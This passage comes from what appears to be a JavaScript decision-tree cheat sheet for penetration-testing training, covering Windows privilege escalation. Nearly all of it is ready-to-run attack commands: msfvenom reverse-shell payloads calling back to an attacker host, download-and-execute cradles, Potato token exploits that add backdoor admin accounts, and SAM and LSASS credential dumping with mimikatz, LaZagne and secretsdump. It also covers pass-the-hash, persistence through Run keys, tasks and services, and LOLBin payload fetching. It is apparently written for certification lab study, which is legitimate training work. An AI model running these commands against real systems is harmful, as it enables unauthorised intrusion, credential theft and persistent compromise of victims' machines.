      { label: "Found creds — spray everything", next: "creds_found" },
      { label: "Weak service binary / unquoted path / DLL", next: "unquoted_service" },
      { label: "Scheduled task with writable binary", next: "scheduled_tasks_win" },
      { label: "AlwaysInstallElevated both keys = 1", next: "always_install_elevated" },
      { label: "Kernel exploit — missing patches", next: "win_kernel_exploit" },
      { label: "Second NIC in ipconfig — pivot opportunity", next: "pivot_start" },
      { label: "PowerShell blocked — AMSI bypass first", next: "amsi_bypass" },
    ],
  },




  windows_enum_quick: {
    phase: "WINDOWS",
    title: "Windows Enum — Quick Reference",
    body: "One-liners only. No explanations. Run top to bottom on a new foothold. Full detail is in windows_post_exploit.",
    cmd: `# ── IDENTITY ─────────────────────────────────────────
whoami /all
whoami /priv
hostname
systeminfo | findstr /i "OS Name\|OS Version\|System Type"

# ── USERS & GROUPS ───────────────────────────────────
net user
net localgroup
Get-LocalGroupMember Administrators
Get-LocalGroupMember "Remote Management Users"
net user <username>
whoami /groups | findstr /i "integrity"
query session

# Get SID
whoami /user
(New-Object System.Security.Principal.NTAccount("<user>")).Translate([System.Security.Principal.SecurityIdentifier]).Value

# ── NETWORK ──────────────────────────────────────────
ipconfig /all
netstat -ano
netstat -ano | findstr "127.0.0.1"
arp -a
route print

# ── PROCESSES ────────────────────────────────────────
Get-Process | Select Id,ProcessName,Path | Where-Object Path -notlike "*Windows*" | Where-Object Path -notlike "*Program Files*"
Get-CimInstance Win32_Process | Select Name,ProcessId,@{N="Owner";E={$_.GetOwner().User}} | Sort Name

# ── SERVICES ─────────────────────────────────────────
Get-CimInstance Win32_Service | Where State -eq "Running" | Select Name,State,PathName
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
Get-CimInstance Win32_Service -Filter "Name='<svcname>'" | Select Name,State,StartName,PathName
sc.exe qc <ServiceName>

# ── APPLICATIONS ─────────────────────────────────────
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
Get-ChildItem "C:\Program Files","C:\Program Files (x86)" | select Name

# ── SCHEDULED TASKS ──────────────────────────────────
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run\|next run"
Get-ScheduledTask | Where TaskPath -notlike "\Microsoft*" | Select TaskName,TaskPath

# ── INTERESTING REGISTRY ─────────────────────────────
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
reg query HKCU\Software\Microsoft\Terminal Server Client\Servers
reg query HKCU\Software\OpenSSH\Agent\Keys
cmdkey /list

# ── PS HISTORY & TRANSCRIPTS ─────────────────────────
type C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
Get-ChildItem C:\Users -Include *transcript* -Recurse -ErrorAction SilentlyContinue

# ── FILE HUNTING ─────────────────────────────────────
Get-ChildItem C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
type C:\Users\$env:USERNAME\AppData\Roaming\FileZilla\sitemanager.xml

# ── PERMISSIONS CHECK ────────────────────────────────
icacls "C:\path\to\binary.exe"
echo "" > "C:\path\test.txt"

# ── AV / DEFENCES ────────────────────────────────────
Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled
WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

# ── QUICK PRIVESC CHECKS ─────────────────────────────
whoami /priv
# SeImpersonatePrivilege = GodPotato/SigmaPotato -> SYSTEM
# SeBackupPrivilege      = reg save SAM/SYSTEM -> dump hashes
# SeDebugPrivilege       = mimikatz token::elevate
Get-ChildItem C:\Windows\System32\inetsrv\appcmd.exe -ErrorAction SilentlyContinue`,
    warn: null,
    choices: [
      { label: "SeImpersonatePrivilege — Potato attack", next: "token_privs" },
      { label: "In Admins but medium integrity — UAC bypass", next: "win_uac_bypass" },
      { label: "Interesting service found", next: "weak_service" },
      { label: "Unquoted service path", next: "unquoted_service" },
      { label: "Creds found in files/history", next: "windows_creds" },
      { label: "Run full automated enum", next: "winpeas" },
      { label: "Kernel exploits — missing patches", next: "win_kernel_exploit" },
    ],
  },

  winpeas: {
    phase: "WINDOWS",
    title: "WinPEAS + Automated Enum",
    body: "Run winPEAS but never rely on it alone. Module 17.1.5: winPEAS missed the meeting note, PSReadline history, and transcript file — the exact vectors that led to privesc. Use it for speed, supplement with manual checks.",
    cmd: `# ── TRANSFER WINPEAS ─────────────────────────────────
# On Kali:
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
# On target:
iwr http://$lhost/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
.\\wp.exe

# ── READ OUTPUT ──────────────────────────────────────
# RED   = misconfigured / special privilege — investigate immediately
# GREEN = protection enabled / well configured
# Focus areas in order:
# 1. Current user privileges (SeImpersonate etc)
# 2. Users and groups
# 3. Password files in home dirs
# 4. Services — unquoted paths, weak perms
# 5. Scheduled tasks
# 6. AlwaysInstallElevated
# 7. Installed software versions

# ── WINPEAS KNOWN GAPS (Module 17.1.5) ──────────────
# winPEAS MISSED on CLIENTWK220:
# - asdf.txt on dave desktop (meeting notes with password)
# - PSReadline history file with Set-Secret password
# - Transcript file in C:\\Users\\Public\\Transcripts
# Always do manual checks even after running winPEAS

# ── POWERUP ──────────────────────────────────────────
iwr http://$lhost/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
. .\\pu.ps1
Invoke-AllChecks

# ── PRIVESCCHECK ─────────────────────────────────────
iwr http://$lhost/PrivescCheck.ps1 -OutFile C:\\Windows\\Temp\\pc.ps1
powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck -Extended"

# ── SEATBELT ─────────────────────────────────────────
# Download precompiled (r3motecontrol repo is most reliable):
# On Kali:
# wget "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
# python3 -m http.server 80
# On Windows:
iwr http://$lhost/Seatbelt.exe -OutFile C:\\Windows\\Temp\\sb.exe
Unblock-File C:\\Windows\\Temp\\sb.exe
C:\\Windows\\Temp\\sb.exe -group=all
C:\\Windows\\Temp\\sb.exe InstalledProducts
C:\\Windows\\Temp\\sb.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.txt

# ── JAWS ──────────────────────────────────────────────
# Download:
# wget "https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1"
iwr http://$lhost/jaws-enum.ps1 -OutFile C:\\Windows\\Temp\\jaws.ps1
powershell -ep bypass -c ". C:\\Windows\\Temp\\jaws.ps1" | Tee-Object -FilePath C:\\Windows\\Temp\\jaws.txt

# ── LAZAGNE — credential dumper ────────────────────────
# Dumps creds from browsers, git, wifi, windows vault etc
# wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
iwr http://$lhost/LaZagne.exe -OutFile C:\\Windows\\Temp\\lz.exe
Unblock-File C:\\Windows\\Temp\\lz.exe
.\\lz.exe all > C:\\Windows\\Temp\\lazagne.txt
type C:\\Windows\\Temp\\lazagne.txt

# ── PRIVESCCHECK EXTENDED (HackTrack method) ───────────
# In-memory — no file drop needed:
(new-object net.webclient).downloadstring("http://$lhost/PrivescCheck.ps1") | iex
Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML

# ── LOCALACCOUNTTOKENFILTERPOLICY ──────────────────────
# Controls UAC remote token filtering for local admins
# 0 (default) = local admins treated as standard users over SMB/WinRM
# 1 = local admins get full admin token remotely (needed for PTH)
reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v LocalAccountTokenFilterPolicy
# Set to 1 to enable full remote admin (requires admin):
reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# ── WES-NG (kernel exploits from systeminfo) ─────────
systeminfo > C:\\Windows\\Temp\\sysinfo.txt
# Transfer sysinfo.txt to Kali then:
# python3 wes.py --update && python3 wes.py sysinfo.txt`,
    warn: "winPEAS is fast but NOT comprehensive. Always check PSReadline history, transcript files, and desktop/home dirs manually — winPEAS consistently misses these. Red findings are high priority but manual enum often finds the actual path.",
    choices: [
      { label: "SeImpersonatePrivilege found", next: "token_privs" },
      { label: "Unquoted service path found", next: "unquoted_service" },
      { label: "AlwaysInstallElevated found", next: "always_install_elevated" },
      { label: "Weak service permissions", next: "weak_service" },
      { label: "Stored creds / SAM", next: "windows_creds" },
      { label: "Nothing clear — check PS history/transcripts", next: "windows_post_exploit" },
    ],
  },


  token_privs: {
    phase: "WINDOWS",
    title: "Token Impersonation (Potato)",
    body: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = instant SYSTEM on almost every Windows version. No Metasploit needed.",
    cmd: `whoami /priv
# Look for: SeImpersonatePrivilege
#           SeAssignPrimaryTokenPrivilege
# IMPORTANT: Disabled != not present
# Disabled means the privilege EXISTS but isnt currently active
# Tools like Potato/SigmaPotato will activate and use it automatically
# AdjustTokenPrivileges can enable Disabled privs — cannot ADD new ones

# ── CHECK ALL DANGEROUS PRIVILEGES ──────────────────
whoami /priv
# High value targets:
# SeImpersonatePrivilege    -> Potato attacks -> SYSTEM
# SeAssignPrimaryToken      -> Potato attacks -> SYSTEM
# SeBackupPrivilege         -> read any file including SAM/SYSTEM
# SeRestorePrivilege        -> write any file -> plant DLL/replace binary
# SeTakeOwnershipPrivilege  -> take ownership of any object
# SeDebugPrivilege          -> inject into SYSTEM processes -> SYSTEM
# SeLoadDriverPrivilege     -> load malicious kernel driver
# SeShutdownPrivilege       -> reboot (useful for service binary hijack)

# ── SeBackupPrivilege — read SAM/SYSTEM ──────────────
# Cannot read via normal copy — use robocopy or reg save
reg save HKLM\\SAM C:\\Windows\\Temp\\sam
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
reg save HKLM\\SECURITY C:\\Windows\\Temp\\security
# Transfer to Kali and dump:
impacket-secretsdump -sam sam -system system -security security local

# ── SeRestorePrivilege — write anywhere ──────────────
# Plant DLL in System32, replace service binary etc
# Use with win_dll_hijack or weak_service workflow

# ── SeTakeOwnershipPrivilege ─────────────────────────
# Take ownership of SAM, then read it
takeown /f C:\\Windows\\System32\\config\\SAM
icacls C:\\Windows\\System32\\config\\SAM /grant administrators:F

# ── SeDebugPrivilege — inject into SYSTEM process ────
# mimikatz
privilege::debug
token::elevate
sekurlsa::logonpasswords

# ── DOWNLOAD LINKS (on Kali) ─────────────────────────
# SigmaPotato (Module 17.3.2 — most recent, recommended)
# wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe

# GodPotato (most universal — Server 2012-2022, Win10-11)
# wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

# PrintSpoofer (Win10 / Server 2016-2019)
# wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

# JuicyPotatoNG
# wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip

# RoguePotato
# wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip

# ── SIGMAPOTATO (Module 17.3.2) ──────────────────────
iwr http://$lhost/SigmaPotato.exe -OutFile C:\\Windows\\Temp\\sp.exe
Unblock-File C:\\Windows\\Temp\\sp.exe
.\\sp.exe "net user hacker pass123! /add"
.\\sp.exe "net localgroup Administrators hacker /add"
# Or reverse shell:
.\\sp.exe "C:\\Windows\\Temp\\shell.exe"

# ── GODPOTATO (most universal) ───────────────────────
iwr http://$lhost/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
Unblock-File C:\\Windows\\Temp\\gp.exe
.\\gp.exe -cmd "cmd /c whoami"
.\\gp.exe -cmd "net user hacker pass123! /add"
.\\gp.exe -cmd "C:\\Windows\\Temp\\shell.exe"

# ── PRINTSPOOFER (Win10 / Server 2016-2019) ──────────
iwr http://$lhost/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\pf.exe
Unblock-File C:\\Windows\\Temp\\pf.exe
.\\pf.exe -i -c cmd
.\\pf.exe -c "C:\\Windows\\Temp\\shell.exe"

# ── ROGUEPOTATO (Win10 1809+ / Server 2019+) ─────────
# On Kali first:
# socat tcp-listen:135,reuseaddr,fork tcp:$lhost:9999
iwr http://$lhost/RoguePotato.exe -OutFile C:\\Windows\\Temp\\rp.exe
Unblock-File C:\\Windows\\Temp\\rp.exe
.\\rp.exe -r $lhost -e "cmd.exe" -l 9999

# ── JUICYPOTATONG (fallback) ─────────────────────────
iwr http://$lhost/JuicyPotatoNG.exe -OutFile C:\\Windows\\Temp\\jp.exe
Unblock-File C:\\Windows\\Temp\\jp.exe
.\\jp.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"`,
    warn: null,
    choices: [
      { label: "Potato worked — SYSTEM!", next: "got_root_windows" },
      { label: "No impersonate privs — check other vectors", next: "winpeas" },
    ],
  },

  unquoted_service: {
    phase: "WINDOWS",
    title: "Unquoted Service Path",
    body: "Service path with spaces and no quotes = Windows searches each path component. Drop your binary in the writable prefix location.",
    cmd: `# Find unquoted paths
wmic service get name,displayname,pathname,startmode \\
  | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"

# Manual check with sc
sc qc <ServiceName>

# Example vulnerable path:
# C:\\Program Files\\Some Folder\\service.exe
# Windows tries: C:\\Program.exe first (writable?)
#               C:\\Program Files\\Some.exe

# Generate payload (no MSF console needed — msfvenom is standalone)
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$lhost LPORT=$lport -f exe -o Program.exe

# Transfer payload to writable location
# Start listener: nc -nlvp $lport
sc stop <ServiceName>
sc start <ServiceName>`,
    warn: null,
    choices: [
      { label: "Service restart — got SYSTEM shell", next: "got_root_windows" },
      { label: "Can't write to that path", next: "weak_service" },
    ],
  },
  windows_creds: {
    phase: "WINDOWS",
    title: "Windows Credential Hunting",
    body: "Hidden in Plain View (Module 17.1.3): users store passwords in config files, meeting notes, PS history. Always re-enumerate after gaining a new user — permissions change what you can read.",
    cmd: `# ── KEEPASS DATABASE ─────────────────────────────────
Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# ── XAMPP / WEB SERVER CONFIGS ───────────────────────
Get-ChildItem -Path C:\\\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
type C:\\\\xampp\\\\passwords.txt
type C:\\\\xampp\\\\mysql\\\\bin\\\\my.ini
# my.ini often has plaintext MySQL password + Windows password comment

# ── USER HOME DIRS ───────────────────────────────────
# Module 17.1.3 pattern — dave found creds in asdf.txt on desktop
Get-ChildItem -Path C:\\\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue

# ── BROAD SEARCH ─────────────────────────────────────
Get-ChildItem -Path C:\\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue

# cmd style
dir /s /b C:\\\\Users\\\\*.xml
dir /s /b C:\\\\Users\\\\*.txt
dir /s /b C:\\*pass*

# ── PSREADLINE HISTORY ───────────────────────────────
(Get-PSReadlineOption).HistorySavePath
type C:\\\\Users\\\\dave\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt
# Check ALL users
Get-ChildItem C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content

# ── POWERSHELL TRANSCRIPTS ───────────────────────────
# Often contain PSCredential creation with plaintext passwords
Get-ChildItem -Path C:\\\\Users -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\\\\Transcripts\\ -ErrorAction SilentlyContinue
type C:\\\\Users\\\\Public\\\\Transcripts\\\\transcript01.txt

# ── EVENT VIEWER — SCRIPT BLOCK LOGS (4104) ─────────
# GUI: Event Viewer -> Apps & Services -> Microsoft -> Windows -> PowerShell -> Operational
# Filter Current Log -> Event ID: 4104
# Ctrl+F: password, net user, admin, secret
# Warning-level events = suspicious — read each one
# NOTE: GUI method more reliable than CLI for this

# ── SAM / REGISTRY CREDS ─────────────────────────────
# Winlogon autologon
reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon" /v DefaultPassword
reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon" /v DefaultUserName

# Credential Manager
cmdkey /list

# Wifi passwords
netsh wlan show profile
netsh wlan show profile "SSID" key=clear

# ── SAM DUMP VIA REGISTRY (needs SYSTEM/admin) ──────
# Save registry hives
reg save HKLM\\sam sam
reg save HKLM\\system system

# Transfer to Kali via SMB share:
# On Kali:
impacket-smbserver -smb2support kali . -username user -password pass
# On Windows:
net use Z: \\\\$lhost\\\\kali /user:user pass
copy sam z:
copy system z:

# Dump hashes on Kali:
impacket-secretsdump -sam sam -system system local

# Pass the hash:
impacket-psexec Administrator@$ip -hashes :NTLMHASH

# ── RUNAS WITH FOUND CREDS ───────────────────────────
# Requires GUI (RDP)
runas /user:HOSTNAME\\\\targetuser cmd
runas /user:HOSTNAME\\\\targetuser powershell
runas /savecred /user:HOSTNAME\\\\targetuser powershell`,
    warn: "Always re-enumerate after gaining access as a new user. Module 17.1.3 chain: dave -> read asdf.txt -> steve creds -> read my.ini -> backupadmin creds -> local admin. Each new user unlocks new files.",
    choices: [
      { label: "Found password — try it on all users/services", next: "creds_found" },
      { label: "Got new user via runas", next: "windows_post_exploit" },
      { label: "Check PS history / transcripts", next: "windows_post_exploit" },
    ],
  },

  scheduled_tasks_win: {
    phase: "WINDOWS",
    title: "Scheduled Tasks Privesc",
    body: "Find scheduled tasks running as SYSTEM or high-priv user with a script/binary you can modify. Module 17.3: if you can write to the script being executed, you own the next run.",
    cmd: `# ── ENUMERATE SCHEDULED TASKS ────────────────────────
# GUI: Task Scheduler
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "task name\\|run as\\|task to run\\|status"

# PowerShell — cleaner output
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "*Microsoft*"} | Select TaskName,TaskPath
Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,LastRunTime,NextRunTime

# ── FIND TASKS RUNNING AS SYSTEM ─────────────────────
schtasks /query /fo LIST /v | findstr /i "run as"
# Look for: Run As User: SYSTEM or Administrator

# ── CHECK SCRIPT/BINARY PERMISSIONS ──────────────────
# Get the script path from the task, then check perms
icacls "C:\\\\scripts\\\\cleanup.ps1"
# If you have (W) write access = replace it

# ── REPLACE SCRIPT CONTENT ───────────────────────────
# Append to the script (safer than replacing)
echo "net user hacker pass123! /add" >> C:\\\\scripts\\\\cleanup.ps1
echo "net localgroup administrators hacker /add" >> C:\\\\scripts\\\\cleanup.ps1

# Or replace entirely with reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o task_payload.exe
# Transfer and place where the task expects it

# ── TRIGGER MANUALLY IF POSSIBLE ────────────────────
schtasks /run /tn "TaskName"

# ── WAIT FOR SCHEDULED RUN ───────────────────────────
# Check next run time:
schtasks /query /tn "TaskName" /fo LIST /v | findstr "Next Run"
# Set up listener before the scheduled time
nc -nlvp 443`,
    warn: null,
    choices: [
      { label: "Got shell from task execution", next: "got_root_windows" },
      { label: "Cannot write to script/binary", next: "weak_service" },
    ],
  },

  always_install_elevated: {
    phase: "WINDOWS",
    title: "AlwaysInstallElevated",
    body: "If both HKCU and HKLM AlwaysInstallElevated keys are set to 1, any user can install MSI packages as SYSTEM. winPEAS flags this automatically.",
    cmd: `# ── CHECK IF VULNERABLE ──────────────────────────────
reg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated
reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated
# Both must be 0x1 to be exploitable

# PowerUp check
Get-RegistryAlwaysInstallElevated

# ── EXPLOIT ──────────────────────────────────────────
# Create malicious MSI on Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f msi -o evil.msi

# Transfer to target
iwr http://$lhost/evil.msi -OutFile C:\\\\Windows\\\\Temp\\\\evil.msi

# Set up listener on Kali
nc -nlvp 443

# Install MSI — runs as SYSTEM
msiexec /quiet /qn /i C:\\\\Windows\\\\Temp\\\\evil.msi

# PowerUp AbuseFunction
Write-UserAddMSI
# Creates a .msi that adds current user to Administrators`,
    warn: "Both HKCU AND HKLM keys must be 0x1 — if only one is set it is not exploitable.",
    choices: [
      { label: "Got SYSTEM shell", next: "got_root_windows" },
    ],
  },
  pth: {
    phase: "WINDOWS",
    title: "Pass the Hash",
    body: "Got NTLM hash but no plaintext password? PTH with impacket tools or CrackMapExec. Requires LocalAccountTokenFilterPolicy=1 for local accounts over network logons.",
    cmd: `# ── DUMP HASHES FIRST ────────────────────────────────
# Via SAM (needs SYSTEM)
reg save HKLM\\sam sam
reg save HKLM\\system system
impacket-secretsdump -sam sam -system system local

# Via secretsdump remote (needs admin creds)
impacket-secretsdump administrator:password@$ip

# Via mimikatz
sekurlsa::logonpasswords

# ── PASS THE HASH ─────────────────────────────────────
# impacket-psexec
impacket-psexec Administrator@$ip -hashes :NTLMHASH

# impacket-wmiexec
impacket-wmiexec Administrator@$ip -hashes :NTLMHASH

# CrackMapExec
crackmapexec smb $ip -u Administrator -H NTLMHASH
crackmapexec smb $ip -u Administrator -H NTLMHASH --exec-method smbexec

# evil-winrm
evil-winrm -i $ip -u Administrator -H NTLMHASH

# ── LOCALACCOUNTTOKENFILTERPOLICY ─────────────────────
# If PTH fails for local admin over network:
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy
# Must be 1 for local accounts to PTH over SMB/WinRM`,
    warn: "PTH only works with NTLM hashes, not Net-NTLMv2. Net-NTLMv2 must be cracked or relayed — it cannot be passed directly.",
    choices: [
      { label: "Got shell via PTH", next: "got_root_windows" },
      { label: "Need to crack hash first", next: "hashcrack" },
    ],
  },

  persistence: {
    phase: "WINDOWS",
    title: "Windows Persistence",
    body: "Maintain access after reboot. Registry run keys, scheduled tasks, service installation, startup folder. Always document and clean up after the engagement.",
    cmd: `# ── REGISTRY RUN KEYS ────────────────────────────────
# HKCU — current user (no admin needed)
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\shell.exe" /f

# HKLM — all users (needs admin)
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\shell.exe" /f

# PowerShell
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\Windows\\Temp\\shell.exe"

# ── SCHEDULED TASK ────────────────────────────────────
schtasks /create /tn "Updater" /tr "C:\\Windows\\Temp\\shell.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "Updater" /tr "C:\\Windows\\Temp\\shell.exe" /sc minute /mo 5

# ── STARTUP FOLDER ───────────────────────────────────
# Current user
copy shell.exe "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
# All users (needs admin)
copy shell.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

# ── SERVICE PERSISTENCE ──────────────────────────────
sc create Updater binpath= "C:\\Windows\\Temp\\shell.exe" start= auto
sc start Updater

# ── CLEANUP ──────────────────────────────────────────
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /f
schtasks /delete /tn "Updater" /f
sc stop Updater && sc delete Updater`,
    warn: "Always document persistence mechanisms and clean up after the engagement.",
    choices: [
      { label: "Back to post-exploit enum", next: "windows_post_exploit" },
      { label: "Pivot to next machine", next: "pivot_start" },
    ],
  },

  lolbins: {
    phase: "WINDOWS",
    title: "LOLBins — Living Off The Land",
    body: "Use Windows built-in binaries to avoid dropping tools. Useful for AV evasion and restricted environments. Reference: lolbas-project.github.io",
    cmd: `# ── FILE TRANSFER ────────────────────────────────────
# certutil — download file
certutil -urlcache -split -f http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe

# bitsadmin
bitsadmin /transfer job http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe

# powershell
(New-Object Net.WebClient).DownloadFile("http://$lhost/shell.exe","C:\\Windows\\Temp\\shell.exe")
iwr http://$lhost/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe

# ── CODE EXECUTION ────────────────────────────────────
# rundll32
rundll32 shell32.dll,ShellExec_RunDLL C:\\Windows\\Temp\\shell.exe

# regsvr32 (AppLocker bypass)
regsvr32 /s /n /u /i:http://$lhost/shell.sct scrobj.dll

# mshta
mshta http://$lhost/shell.hta

# wmic
wmic process call create "C:\\Windows\\Temp\\shell.exe"

# ── UAC BYPASS ────────────────────────────────────────
# iscsicpl.exe — auto-elevated, PATH hijack
# See win_uac_bypass node for full workflow

# ── REFERENCE ─────────────────────────────────────────
# lolbas-project.github.io — full list with examples
# GTFOBins Windows equivalent`,
    warn: null,
    choices: [
      { label: "UAC bypass via LOLBin", next: "win_uac_bypass" },
      { label: "Back to Windows privesc", next: "windows_post_exploit" },
    ],
  },

  win_kernel_exploit: {
    phase: "WINDOWS",
    title: "Kernel / Application Exploits",
    body: "Module 17.3.2: missing patches = kernel exploits. Always verify source code is available before running. Kernel exploits can crash systems — test on a clone first. SeImpersonatePrivilege = SigmaPotato is usually safer.",
    cmd: `# ── ENUMERATE PATCHES / VERSION ──────────────────────
systeminfo
systeminfo | findstr /i "OS Name\|OS Version\|Build"

# Installed security updates
Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Select HotFixID,InstalledOn

# ── WES-NG (Windows Exploit Suggester Next Gen) ───────
# On target:
systeminfo > C:\\Windows\\Temp\\sysinfo.txt
# Transfer to Kali then:
python3 wes.py --update
python3 wes.py sysinfo.txt
python3 wes.py sysinfo.txt --impact "Elevation of Privilege"

# ── CVE-2023-29360 (Win 11 22H2 without KB5027215) ───
# Already on CLIENTWK220 Desktop as steve in Module 17.3.2
.\\CVE-2023-29360.exe
whoami

# ── SEARCHSPLOIT ──────────────────────────────────────
searchsploit windows 10 privilege escalation
searchsploit "windows 11" local privilege

# ── APPLICATION-BASED EXPLOITS ────────────────────────
# Installed apps running as SYSTEM may have vulns
# Check version with Get-ItemProperty then searchsploit
Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select DisplayName,DisplayVersion
Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select DisplayName,DisplayVersion

# ── NOTES ─────────────────────────────────────────────
# Only use kernel exploits when:
# 1. Source code is available to review
# 2. Tested on a clone (can crash system)
# 3. Rules of engagement allow it
# SeImpersonatePrivilege -> Potato is safer alternative`,
    warn: "Kernel exploits can crash the target. Only use when source code is available and rules of engagement allow it. On OSCP — prefer SeImpersonatePrivilege + Potato over kernel exploits.",
    choices: [
      { label: "Got SYSTEM", next: "got_root_windows" },
      { label: "No suitable exploit — try SeImpersonate", next: "token_privs" },
      { label: "Back to full enum", next: "winpeas" },
    ],
  },



  weak_service: {
    phase: "WINDOWS",
    title: "Weak Service Binary Permissions",
    body: "If Users group has Full Access (F) on a service binary — replace it with a malicious one. Module 17.2.1: enumerate with icacls, replace binary, reboot if needed.",
    cmd: `# ── STEP 1: FIND VULNERABLE SERVICE BINARIES ─────────
# List running services with binary paths
# Note: needs RDP/interactive logon — WinRM gives permission denied
# sc.exe query for specific service config:
sc.exe qc <ServiceName>
sc.exe queryex <ServiceName>
# Get-CimInstance filter for specific service:
Get-CimInstance Win32_Service -Filter "Name='mysql'" | Select Name,State,StartName,ProcessId,PathName
# StartName = which user account runs the service

